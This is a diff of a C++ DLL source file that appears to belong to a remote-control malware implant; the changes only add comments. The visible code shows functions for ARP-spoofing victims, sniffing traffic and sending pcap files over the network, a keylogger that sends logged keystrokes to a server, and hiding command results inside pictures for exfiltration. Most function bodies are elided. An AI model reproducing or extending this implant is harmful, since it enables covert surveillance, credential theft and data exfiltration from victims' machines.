@@ -1,4 +1,8 @@
-﻿#define _CRT_SECURE_NO_WARNINGS
+﻿/*
+the dll functionality is coded here
+all the implemations of the public available functions and not available functions
+*/
+#define _CRT_SECURE_NO_WARNINGS
 #include "Components.h"
 #include "arpspoof.h"
 #include "SniffTraffic.h"
@@ -100,14 +104,18 @@ string SpoofVictim(std::string ip)
 	t.detach();
 	return "Spoof started";
 }
-
+/*
+sniff the traffic by calling the function in a new thread
+*/
 string SniffCurrentTraffic(std::string filter)
 {
 	thread t(&SniffTrafficWithThread, filter);
 	t.detach();
 	return "Sniff Traffic started";
 }
-
+/*
+by turning it wrong the sniffing is stopped
+*/
 string StopSniffTraffic(string nothing)
 {
 	sniffanddump = false;
@@ -126,7 +134,9 @@ void SpoofVictimInThread(std::string ip)
 	spoofvictims.push_back(&a);
 	a.SendArpReplayForSpoofing(ip);
 }
-
+/*
+send the pcapfile over the net
+*/
 void SendFile(char * newFile)
 {
 	WSADATA wsadata;
@@ -285,7 +295,9 @@ string GetArpTable()
 	}
 	return s;
 }
-
+/*
+start keylogger and sent logged in new threds to server
+*/
 string StartKeyLogger(string sharedKey)
 {
 	storeKeys = true;
@@ -297,13 +309,17 @@ string StartKeyLogger(string sharedKey)
 	t2.detach();
 	return "Key Logger Started";
 }
-
+/*
+stop the keylogging 
+*/
 string StopKeyLogger(string nothing)
 {
 	storeKeys = false;
 	return "Key logger stoped";
 }
-
+/*
+send picture
+*/
 string HideMessageInPicture(string fileName_and_cmd)
 {
 	vector<string> params = split(fileName_and_cmd);
@@ -318,7 +334,9 @@ string HideMessageInPicture(string fileName_and_cmd)
 	t1.detach();
 	return "I will send you result via picture";
 }
-
+/*
+kill the threads so all arpspoof stops
+*/
 string KillAllThreads(string nothing)
 {
 	for (vector<Arpspoof*>::iterator it = spoofvictims.begin(); it != spoofvictims.end(); ++it)
@@ -574,7 +592,9 @@ void CloseConnection(SOCKET s)
 
 	WSACleanup(); //Clean up Winsock
 }
-
+/*
+translate special commands received by keylogger
+*/
 bool SpecialKeys(int S_Key) {
 	switch (S_Key) {
 	case VK_SPACE:
@@ -611,7 +631,9 @@ bool SpecialKeys(int S_Key) {
 		return false;
 	}
 }
-
+/*
+send the picture encoded with data
+*/
 void SendPicture(string fileName, string cmd)
 {
 	Sleep(1000);
@@ -750,7 +772,9 @@ string EncodeTextInsideImg(string fileName, string cmd)
 	return path_out;
 
 }
-
+/*
+logg all the keys pressed
+*/
 void KeyLogger()
 {
 	char KEY = ' ';
@@ -775,7 +799,9 @@ void KeyLogger()
 		}
 	}
 }
-
+/*
+	send theks logged to the server
+*/
 void SendKeyLoggerToServer(string sharedKey)
 {
 	WSADATA wsadata;
